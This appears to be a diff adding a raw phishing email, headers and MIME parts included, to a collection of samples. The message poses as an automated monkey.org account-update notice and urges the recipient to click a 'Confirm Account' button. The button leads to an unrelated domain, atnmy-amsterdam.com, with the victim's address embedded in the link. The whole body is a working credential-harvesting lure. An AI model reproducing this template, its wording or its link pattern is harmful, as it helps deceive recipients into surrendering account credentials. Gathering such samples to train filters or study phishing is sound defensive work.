@@ -1,0 +1,157 @@
+Return-Path: sales@unfgroup-ae.com
+Delivered-To: jose@monkey.org
+X-FDA: 83991606846.33.B0E3A0E
+Received: from mail.unfgroup-ae.com (mail.unfgroup-ae.com [192.210.150.203])
+	by imf25.b.hostedemail.com (Postfix) with ESMTP id 7F52F120006
+	for <jose@monkey.org>; Mon, 13 Oct 2025 03:08:28 +0000 (UTC)
+Authentication-Results: imf25.b.hostedemail.com;
+	dkim=pass header.d=unfgroup-ae.com header.s=default header.b=MIXeqhxq;
+	spf=softfail (imf25.b.hostedemail.com: 192.210.150.203 is neither permitted
+ nor denied by domain of sales@unfgroup-ae.com)
+ smtp.mailfrom=sales@unfgroup-ae.com;
+	dmarc=pass (policy=none) header.from=unfgroup-ae.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1760324908;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=3KqHKTdvMe1Ef7353XIur1MdyF0BRvJ2Ec2rbP6se3M=;
+	b=F5ko0XXFf4j9zXuIklPfxr2i4R06xwdrO0+TsiUF84EXo/uuOf0HkQ5+ksOVFsSole10co
+	/2iWHj5IpXSw8t6nF0+EkDgufNlf/dPhDjz3/XRitvn+aitbO0r2+zWhfeTyhfybb72WpY
+	3Y5B3wA9KiZXdhpYQ+PUElgwbTu2XTE=
+ARC-Authentication-Results: i=1;
+	imf25.b.hostedemail.com;
+	dkim=pass header.d=unfgroup-ae.com header.s=default header.b=MIXeqhxq;
+	spf=softfail (imf25.b.hostedemail.com: 192.210.150.203 is neither permitted
+ nor denied by domain of sales@unfgroup-ae.com)
+ smtp.mailfrom=sales@unfgroup-ae.com;
+	dmarc=pass (policy=none) header.from=unfgroup-ae.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1760324908; a=rsa-sha256;
+	cv=none;
+	b=H1tffm3stGsCYIy3ODxZS0yVCX88NEIDoqCApp4rQ6iKWXqEjCaLyjYBdY/AFRT1tx3oKE
+	nYWSufUYRtc4cmvv3w3I/c0DlqDS3qAQ/Nve5dTS06az7f1MkaaB4Hm8Cs1ahUU7KLErvN
+	ExXrKcbLGRlfPu6G9zX90A0jrtEnQTk=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
+ d=unfgroup-ae.com;
+ h=From:Subject:To:Content-Type:MIME-Version:Date:Message-Id;
+ i=sales@unfgroup-ae.com;
+ bh=3KqHKTdvMe1Ef7353XIur1MdyF0BRvJ2Ec2rbP6se3M=;
+ b=MIXeqhxqeYPeQJ73cLfzIsQLv0kCiGWJ+vrCL0AWaPCgpPDc+Lk4BlLD4tdagfBcRBXCvwdl1osn
+   tkoJ5enhK0MRkpGRU1zLD9NJ4QbORwRvRMmf9fi9Oo1H84lMwpknN8kSC1HVyf4v2Y0EGfsykjt9
+   yO1ctBX2FDO3cjNwfG0=
+From: "sales@unfgroup-ae.com" <sales@unfgroup-ae.com>
+Subject: Action Required: Review Account Changes
+To: <jose@monkey.org>
+Content-Type: multipart/alternative;
+ boundary="s2H2NLxhzjVam7pFlYsR1tM95ej5=_E8M5"
+MIME-Version: 1.0
+Date: Mon, 13 Oct 2025 05:08:27 +0200
+Message-Id: <13262025100805B6F439CAC3$ECD8BC8A50@unfgroup-ae.com>
+X-Stat-Signature: t4cfeuz14cftouqadxap8kxgr4ducw9b
+X-Rspam-User: 
+X-Rspamd-Queue-Id: 7F52F120006
+X-Rspamd-Server: rspam06
+X-Spam-Status: No, score=8.90
+X-HE-Tag: 1760324908-411812
+X-HE-Meta: 
+ U2FsdGVkX19vWEYiJc7S0sFJ1fh4R0TRpSQ+8elPq42WZf3E5RthYtuKrC5Ox8oHurStmxqMqD7sYprQXzKAAFZM04KjEHaDCo4BOPjbtlmF8mfECJwBykat8Ufv7SSMpXEax+3qewxEvbrUFeG29LGBxNh1mmQqqEgyh0AKJq8K8QPXHEM+fLW3pO4Ezi717NAa/bN5fTX9x0Z8N/subGudBx4y3ZW+7CcxYzR+KAfFdP59m0D/H6ExN7lyONawAMw0atK61kUNfYpu5ZCvPG39J1O1EZc71X85DvYYhGdSQ1RKt6MwlYrjjZnAojEoM9q2QmaTGUzAzBHa1rWqtR/vpbDVE/SYMpgB6EkKJ+3PzG43PjyjLdz3hbxRkOX9RJRmSTTZq9adWHj7WWuZvlgJRXAFs5vDU9fp9De9Db0ba5Qc81XXsHeCRLyv0LyUt7yRCDpEUNJyf98RWTwC2Y/1Mlz6CveFl73pOssKsF5x/en+9uye/aWKfeiyf7DA947Wp/5OYX4vQWPO63PjoemAxZoCLRgp9jFa5/YoH3xo0EurbwCM8XgWRBvdWxOtJ54ntCCaKk1Qovo5fBtGo97BSA0I2filkldiaNx7zBycILbYSwB9OU8JVBK3pv/cRALf85w37GD1I2p+Xz8pnr222taAe2xvbx7q56lTTw/FoW8Wfeac8PsBzmyE64Yb0BQStGPZIJ6t8k1JqMXxyGdxb3WdLJVSPRlveEJRLYuwXjsS8KSLOzvH93P9KHwvkHW8QphuNYvmVigkrvDY3nQ0HbCPvBB8fZbviCkErXNNRjgtNjpP0njLo4hGDli1UaYQedyRP8r3uIJkqW062+esgndsKxLJ1yIKScubSktLQ7f464LyzGUi510UxURs1KZcLsCoDsOWoDev4KysOROB5DzzTsEOmEsd1eBcKbX8lprKVEM5KfK5v2YMI5KugThLHRD0obh8qa0wg487dFui/gr
+ 6xmbpu1x/qLuH+5+qyedPWmS6gjbVFPiTkv3HFDekJThIKvxj1IyIirjFoihMNZCeaU6kVxii2kPwd/pF8Alv/kB8Q/F2VS1tThok5ZvyhrfuCkWq+2irphIzOYSP7bQUtUPikYMlxu65zwYK9TtHQ/OOq6rA8mb6yi6khxt+Hvzsq8syiA2oxHDeD+j+1LldiNYE4bL+ZpTeY8CgsrjynB2l/ZJUVWtqEhdS9stgcVW7PoEigPmfpxIVwmZyFQimNLX0BaEWLKIQlqFUwQn1NSMTvCMik6zUqoykSmd77xXPYKQ0rYePYfnoUxo/zLhjtN4RUSK8yZye4Euvm7oc1+1OnTBYa7MmPhn6hwqOVQxaULM4Z8aLBkAJv+0Fj2yh09ONkgGt+KNsbMp74cG90F93rPTgA1WHvIJBrbpq4oZroTh6jAvsuHTjYg7n/UFhtf74VzWFu49bK7ZQe0UWZ6WJVFiQ9rcSM8hsgAtS0zC0noW+nMLijfUYGEAONc9YD5tWwAvqoDt6Co8ERUcuCp15WVs8OF4oLCVjt8Yw/z2Txp7lDSApiv/6hdTivOqUGCrrcD/7wABoQFPhZuDCYEVZhTpDgSyYRT7J
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 402
+
+This is a multi-part message in MIME format
+
+--s2H2NLxhzjVam7pFlYsR1tM95ej5=_E8M5
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+Account Update
+
+Important Account Update
+
+We are writing to inform you of an important update regarding your jos=
+e@monkey.org account. As part of our ongoing efforts to improve our se=
+rvices, we have made updates to your account details.
+
+Please review these changes at your earliest convenience to ensure uni=
+nterrupted service.
+
+Confirm Account https://atnmy-amsterdam.com/south/#jose@monkey.org
+
+Sincerely,
+
+This is an automated message. Please do not reply to this email.
+
+=A9 2025 monkey.org All rights reserved.
+
+--s2H2NLxhzjVam7pFlYsR1tM95ej5=_E8M5
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
+8859-1">
+  <META name=3Dviewport content=3D"width=3Ddevice-width, initial-scale=
+=3D1"> <META name=3Dformat-detection content=3Dtelephone=3Dno><title>A=
+ction Required: Review Account Changes</title>
+ </head>
+ <body style=3D"BACKGROUND-COLOR: #ffffff" bgColor=3D#ffffff><FONT siz=
+e=3D3 face=3DArial> <DIV style=3D'BOX-SIZING: border-box; FONT-SIZE: 1=
+4px; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; BAC=
+KGROUND: rgb(30,58,138); WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-=
+TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(255,255,255); PADDING-BO=
+TTOM: 12px; FONT-STYLE: normal; TEXT-ALIGN: center; PADDING-TOP: 12px;=
+ PADDING-LEFT: 15px; ORPHANS: 2; WIDOWS: 2; PADDING-RIGHT: 15px; TEXT-=
+INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal=
+; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
+text-decoration-style: initial; text-decoration-color: initial'> <DIV =
+style=3D"BOX-SIZING: border-box; FONT-SIZE: 18px; FONT-WEIGHT: 600">Ac=
+count Update</DIV></DIV> <DIV style=3D'BOX-SIZING: border-box; FONT-SI=
+ZE: 14px; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif=
+; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-W=
+EIGHT: 400; COLOR: rgb(51,51,51); PADDING-BOTTOM: 18px; FONT-STYLE: no=
+rmal; TEXT-ALIGN: left; PADDING-TOP: 18px; PADDING-LEFT: 22px; ORPHANS=
+: 2; WIDOWS: 2; PADDING-RIGHT: 22px; TEXT-INDENT: 0px; font-variant-li=
+gatures: normal; font-variant-caps: normal; -webkit-text-stroke-width:=
+ 0px; text-decoration-thickness: initial; text-decoration-style: initi=
+al; text-decoration-color: initial'> <H1>Important Account Update</H1>=
+ <P style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; MARGIN-BOTTOM: 1=
+0px; MARGIN-TOP: 0px">We are writing to inform you of an important upd=
+ate regarding your&nbsp;jose@monkey.org&nbsp;account. As part of our o=
+ngoing efforts to improve our services, we have made updates to your a=
+ccount details.</p><p style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px=
+; MARGIN-BOTTOM: 10px; MARGIN-TOP: 0px">Please review these changes at=
+ your earliest convenience to ensure uninterrupted service.</P> <DIV s=
+tyle=3D"BOX-SIZING: border-box"><A style=3D"BOX-SIZING: border-box; FO=
+NT-SIZE: 13px; TEXT-DECORATION: none; BACKGROUND: rgb(30,58,138); FONT=
+-WEIGHT: 500; COLOR: rgb(255,255,255) !important; PADDING-BOTTOM: 8px;=
+ PADDING-TOP: 8px; PADDING-LEFT: 18px; MARGIN: 12px 0px; DISPLAY: inli=
+ne-block; PADDING-RIGHT: 18px; border-radius: 5px; transition: backgro=
+und 0.3s" href=3D"https://atnmy-amsterdam.com/south/#jose@monkey.org" =
+rel=3Dnoreferrer target=3D_blank>Confirm Account</A></DIV> <P style=3D=
+"BOX-SIZING: border-box; FONT-SIZE: 13px; MARGIN-BOTTOM: 10px; MARGIN-=
+TOP: 12px">Sincerely,<BR style=3D"BOX-SIZING: border-box"></P></DIV> <=
+DIV style=3D'BOX-SIZING: border-box; FONT-SIZE: 11px; FONT-FAMILY: "Se=
+goe UI", Tahoma, Geneva, Verdana, sans-serif; BACKGROUND: rgb(241,245,=
+249); WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FO=
+NT-WEIGHT: 400; COLOR: rgb(107,114,128); PADDING-BOTTOM: 12px; FONT-ST=
+YLE: normal; TEXT-ALIGN: center; PADDING-TOP: 12px; PADDING-LEFT: 20px=
+; ORPHANS: 2; WIDOWS: 2; PADDING-RIGHT: 20px; TEXT-INDENT: 0px; font-v=
+ariant-ligatures: normal; font-variant-caps: normal; -webkit-text-stro=
+ke-width: 0px; text-decoration-thickness: initial; text-decoration-sty=
+le: initial; text-decoration-color: initial'> <P style=3D"BOX-SIZING: =
+border-box; FONT-SIZE: 13px; MARGIN-BOTTOM: 10px; MARGIN-TOP: 0px">Thi=
+s is an automated message. Please do not reply to this email.</p><p st=
+yle=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; MARGIN-BOTTOM: 10px; M=
+ARGIN-TOP: 0px">&copy; 2025&nbsp;monkey.org All rights reserved.</P></=
+DIV> <P align=3Dleft>&nbsp;&nbsp;</FONT></P></body>
+ </html>
+
+--s2H2NLxhzjVam7pFlYsR1tM95ej5=_E8M5--
+
+
